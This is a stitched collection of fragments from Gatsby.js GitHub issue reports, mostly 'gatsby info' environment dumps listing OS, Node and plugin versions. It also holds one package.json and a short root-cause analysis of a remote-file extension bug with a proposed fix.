``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1 ```
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 safari: 13.0.5 npmglobalpackages: gatsby-cli: 2.11.1
system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.7.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.6 - /usr/local/bin/npm languages: python: 3.7.5 - /users/leonz/anaconda3/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: 2.15.22 => 2.15.22 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.38 gatsby-plugin-manifest: ^2.2.39 => 2.2.48 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-preload-link-crossorigin: ^1.0.2 => 1.0.2 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.24 gatsby-plugin-styled-components: ^3.1.18 => 3.1.21 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-contentful: 2.1.98 => 2.1.98 gatsby-source-medium: ^2.1.20 => 2.1.22 gatsby-transformer-remark: ^2.6.53 => 2.6.59 npmglobalpackages: gatsby-cli: 2.7.53
``` system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i3-4150 cpu @ 3.50ghz shell: 4.4.20 - /bin/bash binaries: node: 12.9.1 - ~/.nvm/versions/node/v12.9.1/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.3 - ~/.nvm/versions/node/v12.9.1/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.34 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-catch-links: ^2.1.21 => 2.1.21 gatsby-plugin-manifest: ^2.2.31 => 2.2.31 gatsby-plugin-netlify: ^2.1.30 => 2.1.30 gatsby-plugin-netlify-cms: ^4.1.33 => 4.1.33 gatsby-plugin-offline: ^3.0.30 => 3.0.30 gatsby-plugin-optimize-svgs: ^1.0.3 => 1.0.3 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.26 => 2.1.26 gatsby-plugin-sharp: ^2.3.5 => 2.3.5 gatsby-plugin-sitemap: ^2.2.26 => 2.2.26 gatsby-remark-autolink-headers: ^2.1.22 => 2.1.22 gatsby-remark-copy-linked-files: ^2.1.35 => 2.1.35 gatsby-remark-images: ^3.1.39 => 3.1.39 gatsby-remark-lazy-load: ^1.0.2 => 1.0.2 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.3.29 => 3.3.29 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-remark-smartypants: ^2.1.19 => 2.1.19 gatsby-source-filesystem: ^2.1.40 => 2.1.40 gatsby-transformer-remark: ^2.6.45 => 2.6.45 gatsby-transformer-sharp: ^2.3.7 => 2.3.7 ```
this is on the gatsbyjs.org website itself.
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.10.1 - /usr/local/bin/node npm: 6.13.7 - /usr/local/bin/npm languages: python: 3.7.6 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.21 => 2.19.21 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-image: ^2.2.43 => 2.3.0 gatsby-plugin-catch-links: ^2.1.27 => 2.2.0 gatsby-plugin-create-client-paths: ^2.1.23 => 2.2.0 gatsby-plugin-mdx: ^1.0.82 => 1.1.0 gatsby-plugin-postcss: ^2.1.21 => 2.2.0 gatsby-plugin-react-helmet: ^3.1.23 => 3.2.0 gatsby-plugin-remove-trailing-slashes: ^2.1.23 => 2.2.0 gatsby-plugin-sass: ^2.1.30 => 2.2.0 gatsby-plugin-sharp: ^2.4.12 => 2.5.1 gatsby-source-filesystem: ^2.1.55 => 2.2.1 gatsby-transformer-sharp: ^2.3.18 => 2.4.1 gatsby-transformer-yaml: ^2.2.26 => 2.3.0 ```
`gatsby info --clipboard` didn't show anything or put anything on my clipboard ## root cause
the problem comes from [`create-remote-file-node.js`, line 230][1]
if an `ext` wasn't provided as an argument, it tries to get the extension using [`getremotefileextension`][2]
that function is defined in the utils
it calls [`getparsedpath`][3], which uses node apis to get the path, and from there we get the extension
for some reason that gives back the wrong extension, resulting in `.`
going back to `create-remote-file-node.js`, but now to [line 245][4], we can see how we handle the case where the previous code returned an empty string as the file extension
in that case we open the file and use `file-type` to get the right extension
i assume we do it in that order because opening a file is computationally expensive, so we try to avoid opening the file as much as we can
## possible solution
i think in [line 245][4] we should also use `file-type` for any other invalid extension, not only the empty string
probably just updating line 245 like this could just work:
if (ext === `` || ext === '.') {
``` but another option could be to create a utility method `isextensioninvalid` that returns `true` or `false` that could be more flexible and easily extended for future invalid extensions found
line 245 would become something like ```js
if (isextensioninvalid(ext)) {
and in utils
const isextensioninvalid = ext => ext === ' ' || ext === '.' || ext === '?' // any other invalid extension returned by getremotefileextension
``` i'll be happy to open a pr with either solution, or whatever we decide should be implemented
## related issues
i opened an issue in `gatsby-source-airtable` to track a possible solution from that side
however, we think the issue should be solved here because a file name ending in `...` could also happen outside of airtable
[1]: #l230
[2]: #l27
[3]: #l14
[4]: #l245
``` system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-4770k cpu @ 3.50ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python browsers: edge: 44.17763.831.0
``` i've tried hard reloading and turning on dev mode in cloudflare so i don't believe it's a cache problem
system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-2520m cpu @ 2.50ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.2 => 2.20.2 gatsby-plugin-react-helmet: ^3.2.0 => 3.2.0 gatsby-plugin-sass: ^2.2.0 => 2.2.0 #### my packcage.json:
{ "name": "personal-page", "description": "my personal page", "author": "@carloslsilva", "private": true, "scripts": { "start": "npm run develop", "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve", "clean": "gatsby clean", "test": "echo \\"write tests! -> \\"", "format": "prettier --write \\"**/*.{js,jsx,json,md,css,scss}\\"" }, "license": "isc", "dependencies": { "gatsby": "^2.20.2", "gatsby-plugin-react-helmet": "^3.2.0", "gatsby-plugin-sass": "^2.2.0", "node-sass": "^4.13.1", "react": "^16.13.1", "react-dom": "^16.13.1", "react-helmet": "^5.2.1" }, "devdependencies": { "prettier": "^1.19.1" }
$ gatsby info --clipboard system: os: linux 5.4 fedora 31 (thirty one) 31 (thirty one) cpu: (6) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v12.14.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.0/bin/npm languages: python: 3.7.4 - /home/vagrant/anaconda3/bin/python browsers: chrome: 79.0.3945.117 firefox: 72.0.1 npmpackages: gatsby: ^2.18.12 => 2.19.10 gatsby-image: ^2.2.34 => 2.2.39 gatsby-plugin-apollo: ^3.0.1 => 3.0.1 gatsby-plugin-emotion: ^4.1.21 => 4.1.21 gatsby-plugin-google-tagmanager: ^2.1.25 => 2.1.25 gatsby-plugin-manifest: ^2.2.31 => 2.2.40 gatsby-plugin-react-axe: ^0.3.0 => 0.3.0 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.21 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.3.5 => 2.4.4 gatsby-plugin-sitemap: ^2.2.26 => 2.2.26 gatsby-plugin-tsconfig-paths: ^1.0.1 => 1.0.2 gatsby-plugin-tslint: ^0.0.2 => 0.0.2 gatsby-plugin-typescript: ^2.1.26 => 2.1.26 gatsby-source-filesystem: ^2.1.40 => 2.1.47 gatsby-source-graphql: ^2.1.32 => 2.1.32 gatsby-transformer-sharp: ^2.3.7 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.30
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 13.8.0 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.25 => 2.19.25 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-cli: ^2.7.26 => 2.9.0 gatsby-image: ^2.2.41 => 2.2.42 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.22 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.0.34 => 2.4.5 gatsby-plugin-sitemap: ^2.2.6 => 2.2.27 gatsby-plugin-styled-components: ^3.1.5 => 3.1.19 gatsby-plugin-stylus: ^2.0.7 => 2.1.21 gatsby-plugin-typescript: ^2.1.26 => 2.2.0 gatsby-source-contentful: ^2.0.67 => 2.1.89 gatsby-transformer-remark: ^2.3.8 => 2.6.53 gatsby-transformer-sharp: ^2.3.13 => 2.3.16
system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.1 - /var/folders/6l/z9xsxrqd1y50vpdsfjd189w0tgx7q7/t/yarn--1584635975554-0.7094580855450245/node yarn: 1.17.3 - /var/folders/6l/z9xsxrqd1y50vpdsfjd189w0tgx7q7/t/yarn--1584635975554-0.7094580855450245/yarn npm: 6.10.2 - ~/.npm-global/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 71.0 safari: 13.0.5
``` thank you so much for any help or insight!
gatsby 2.19.48
``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.2 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 72.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-image: ^2.2.44 => 2.2.44 gatsby-plugin-netlify: ^2.1.35 => 2.1.35 gatsby-plugin-netlify-cms: ^4.1.42 => 4.1.42 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.24 => 3.1.24 gatsby-plugin-sass: ^2.1.31 => 2.1.31 gatsby-plugin-sharp: ^2.4.13 => 2.4.13 gatsby-remark-copy-linked-files: ^2.1.40 => 2.1.40 gatsby-remark-images: ^3.1.50 => 3.1.50 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.1.56 => 2.1.56 gatsby-transformer-remark: ^2.6.59 => 2.6.59 gatsby-transformer-sharp: ^2.3.19 => 2.3.19 npmglobalpackages: gatsby-cli: 2.8.27 ```
system: os: windows 10 10.0.18363 cpu: (12) x64 amd ryzen 5 2600x six-core processor binaries: node: 12.16.1 - c:\\users\\54357\\scoop\\apps\ odejs-lts\\current\ ode.exe yarn: 1.22.4 - c:\\users\\54357\\scoop\\apps\\yarn\\current\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\users\\54357\\scoop\\apps\ odejs-lts\\current\ pm.cmd languages: python: 3.7.7 - c:\\users\\54357\\scoop\\shims\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.7 => 2.19.43 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-catch-links: ^2.1.21 => 2.1.27 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-generate-typings: ^0.9.8-r1 => 0.9.8-r1 gatsby-plugin-google-analytics: ^2.1.31 => 2.1.37 gatsby-plugin-manifest: ^2.2.39 => 2.2.47 gatsby-plugin-minify-classnames: ^0.1.2 => 0.1.2 gatsby-plugin-offline: ^3.0.40 => 3.0.40 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.26 => 2.1.30 gatsby-plugin-sharp: ^2.4.12 => 2.4.12 gatsby-plugin-sitemap: ^2.2.29 => 2.2.29 gatsby-plugin-typescript: ^2.2.3 => 2.2.3 gatsby-remark-copy-linked-files: ^2.1.39 => 2.1.39 gatsby-remark-images: ^3.1.49 => 3.1.49 gatsby-remark-prismjs: ^3.3.35 => 3.3.35 gatsby-remark-responsive-iframe: ^2.2.33 => 2.2.33 gatsby-remark-smartypants: ^2.1.19 => 2.1.22 gatsby-source-filesystem: ^2.1.55 => 2.1.55 gatsby-transformer-json: ^2.2.22 => 2.2.27 gatsby-transformer-remark: ^2.6.58 => 2.6.58 gatsby-transformer-sharp: ^2.3.9 => 2.3.18
system: os: windows 10 10.0.17763 cpu: (4) x64 intel(r) core(tm) i7-6560u cpu @ 2.20ghz binaries: node: 10.16.0 - c:\\program files\ odejs\ ode.exe yarn: 1.16.0 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.3 - /c/python/python browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-plugin-sass: ^2.1.31 => 2.1.31 gatsby-source-contentful: ^2.1.97 => 2.1.97 gatsby-source-filesystem: ^2.1.56 => 2.1.56
$ gatsby info --clipboard system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz binaries: node: 10.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.4 - /c/users/miguel/appdata/local/programs/python/python37-32/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
``` system: os: macos 10.15.3 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.22.4 - ~/.yvm/shim/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 69.0.1 safari: 13.0.5
system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 10.16.0 - c:\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.7 - c:\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: 2.19.43 => 2.19.43 gatsby-image: ^2.2.39 => 2.2.43 gatsby-plugin-manifest: ^2.2.39 => 2.2.47 gatsby-plugin-offline: ^3.0.32 => 3.0.40 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.23 gatsby-plugin-sharp: ^2.4.3 => 2.4.12 gatsby-source-filesystem: ^2.1.46 => 2.1.55 gatsby-transformer-sharp: ^2.3.13 => 2.3.18
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 80.0.3987.132 firefox: 71.0 safari: 13.0.5 npmpackages: gatsby: ^2.19.43 => 2.19.43 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-manifest: ^2.2.47 => 2.2.47 gatsby-plugin-offline: ^3.0.40 => 3.0.40 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-sharp: ^2.4.12 => 2.4.12 gatsby-source-filesystem: ^2.1.55 => 2.1.55 gatsby-source-graphql: ^2.1.34 => 2.1.34 gatsby-transformer-sharp: ^2.3.18 => 2.3.18 ```
``` system: os: windows 10 10.0.18363 cpu: (12) x64 amd ryzen 5 1600 six-core processor binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.43 => 2.19.43 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-feed: ^2.3.28 => 2.3.28 gatsby-plugin-google-analytics: ^2.1.37 => 2.1.37 gatsby-plugin-lunr: ^1.5.2 => 1.5.2 gatsby-plugin-manifest: ^2.2.47 => 2.2.47 gatsby-plugin-offline: ^3.0.40 => 3.0.40 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.12 => 2.4.12 gatsby-plugin-sitemap: ^2.2.29 => 2.2.29 gatsby-plugin-transition-link: ^1.18.0 => 1.18.0 gatsby-plugin-typescript: ^2.2.3 => 2.2.3 gatsby-remark-autolink-headers: ^2.1.25 => 2.1.25 gatsby-remark-copy-linked-files: ^2.1.39 => 2.1.39 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.49 => 3.1.49 gatsby-remark-images-medium-zoom: ^1.4.0 => 1.4.0 gatsby-remark-prismjs: ^3.3.35 => 3.3.35 gatsby-remark-responsive-iframe: ^2.2.33 => 2.2.33 gatsby-remark-video: ^1.2.5 => 1.2.5 gatsby-source-filesystem: ^2.1.55 => 2.1.55 gatsby-transformer-json: ^2.2.27 => 2.2.27 gatsby-transformer-remark: ^2.6.58 => 2.6.58 gatsby-transformer-sharp: ^2.3.18 => 2.3.18
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 10.16.3 - c:\\program files\ odejs\ ode.exe yarn: 1.13.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.2 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.1 - d:\\software\\msys2\\mingw64\\bin\\python.exe browsers: edge: 44.18362.449.0
``` this issue is similar with #19029, but that issue do not contain any useful infomations.
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz binaries: node: 12.4.0 - c:\\program files\ odejs\ ode.exe yarn: 1.19.1 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.13.2 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.3.25 => 2.19.34 gatsby-image: ^2.0.39 => 2.2.43 gatsby-plugin-feed-mdx: ^1.0.0 => 1.0.1 gatsby-plugin-google-analytics: ^2.0.18 => 2.1.37 gatsby-plugin-manifest: ^2.0.29 => 2.2.45 gatsby-plugin-mdx: ^1.0.52 => 1.0.78 gatsby-plugin-netlify-cms: ^4.0.0 => 4.1.41 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.23 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.0.35 => 2.4.8 gatsby-plugin-styled-components: ^3.0.7 => 3.1.20 gatsby-plugin-typography: ^2.2.13 => 2.3.24 gatsby-remark-copy-linked-files: ^2.0.11 => 2.1.39 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-responsive-iframe: ^2.1.1 => 2.2.33 gatsby-remark-smartypants: ^2.0.9 => 2.1.22 gatsby-remark-vscode: ^1.0.4 => 1.4.0 gatsby-source-filesystem: ^2.0.29 => 2.1.51 gatsby-transformer-sharp: ^2.1.18 => 2.3.17
system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.0.3 - /bin/bash binaries: node: 12.16.0 - /tmp/yarn--1584111821045-0.9563755931787925/node yarn: 1.22.4 - /tmp/yarn--1584111821045-0.9563755931787925/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 73.0.3683.75 firefox: 72.0.1
system: os: linux 4.15 ubuntu 16.04.6 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i5-6300hq cpu @ 2.30ghz shell: 4.3.48 - /bin/bash binaries: node: 13.7.0 - ~/.nvm/versions/node/v13.7.0/bin/node npm: 6.13.7 - ~/.nvm/versions/node/v13.7.0/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 74.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-background-image: ^0.10.1 => 0.10.1 gatsby-image: ^2.2.41 => 2.2.41 gatsby-plugin-manifest: ^2.2.47 => 2.2.47 gatsby-plugin-playground: ^1.0.6 => 1.0.6 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-sitemap: ^2.2.29 => 2.2.29 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-plugin-transition-link: ^1.17.7 => 1.17.7 gatsby-source-contentful: ^2.1.86 => 2.1.86 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-sharp: ^2.3.14 => 2.3.14 npmglobalpackages: gatsby-cli: 2.10.9
``` system: os: linux 5.0 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (32) x64 intel(r) xeon(r) cpu @ 2.30ghz shell: 4.4.12 - /bin/bash binaries: node: 12.15.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.9.2 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.19.10 => 2.19.10 gatsby-image: ^2.2.6 => 2.2.6 gatsby-plugin-advanced-sitemap: ^1.4.5 => 1.4.5 gatsby-plugin-catch-links: ^2.1.4 => 2.1.4 gatsby-plugin-env-variables: ^1.0.1 => 1.0.1 gatsby-plugin-force-trailing-slashes: ^1.0.4 => 1.0.4 gatsby-plugin-google-tagmanager: ^2.1.4 => 2.1.4 gatsby-plugin-netlify: ^2.1.3 => 2.1.3 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-react-axe: ^0.2.2 => 0.2.2 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.3 => 2.1.3 gatsby-plugin-sharp: ^2.4.4 => 2.4.4 gatsby-source-drupal: ^3.2.19 => 3.2.19 gatsby-source-filesystem: ^2.1.8 => 2.1.8 gatsby-transformer-sharp: ^2.3.6 => 2.3.6
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-3615qm cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 8.10.0 - /usr/local/bin/node npm: 5.6.0 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 80.0.3987.132 safari: 13.0.5 npmpackages: gatsby: ^2.19.32 => 2.19.32 gatsby-background-image: ^0.8.0 => 0.8.0 gatsby-image: ^2.1.4 => 2.1.4 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-manifest: ^2.2.44 => 2.2.44 gatsby-plugin-netlify: ^2.1.34 => 2.1.34 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-sharp: ^2.1.9 => 2.1.9 gatsby-source-contentful: ^2.1.92 => 2.1.92 gatsby-source-filesystem: ^2.0.43 => 2.0.43 gatsby-transformer-remark: ^2.6.32 => 2.6.32 gatsby-transformer-sharp: ^2.1.21 => 2.1.21 npmglobalpackages: gatsby-cli: 2.10.4
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-2500s cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.1/bin/yarn npm: 6.14.2 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 80.0.3987.132 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-plugin-emotion: ^4.1.24 => 4.1.24 gatsby-plugin-typography: ^2.3.24 => 2.3.24 gatsby-source-filesystem: ^2.1.53 => 2.1.53 gatsby-transformer-remark: ^2.6.58 => 2.6.58 npmglobalpackages: gatsby-cli: 2.10.4
system: os: windows 10 10.0.17763 cpu: (4) x64 intel(r) core(tm) i5-2400 cpu @ 3.10ghz binaries: node: 10.15.3 - c:\\program files\ odejs\ ode.exe npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-netlify: ^2.1.33 => 2.1.33 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-wordpress: ^3.1.60 => 3.1.60 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
$ gatsby info system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.0.11 - /usr/local/bin/bash binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.15 - /users/ruichen/.pyenv/shims/python browsers: chrome: 80.0.3987.132 firefox: 73.0.1 safari: 13.0.5
